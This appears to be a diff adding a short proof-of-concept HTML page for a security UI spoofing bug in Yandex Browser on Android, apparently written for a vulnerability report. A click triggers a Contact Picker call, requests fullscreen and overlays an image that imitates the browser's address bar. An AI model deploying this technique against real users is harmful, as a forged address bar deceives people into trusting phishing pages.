@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof Yandex Android</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                object-fit: fill;
+                z-index: 9999;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    try { await navigator.contacts.select(["name"], {}); } catch (e) {}
+                })();
+                document.getElementById("spoof").style.display = "block";
+                document.getElementById("content").style.display = "none";
+                document.body.style.overflow = "hidden"; 
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" src="edgespoof.jpg">
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the yandex omnibox!</h1>
+            </center>
+        </div>
+    </body>
+</html>
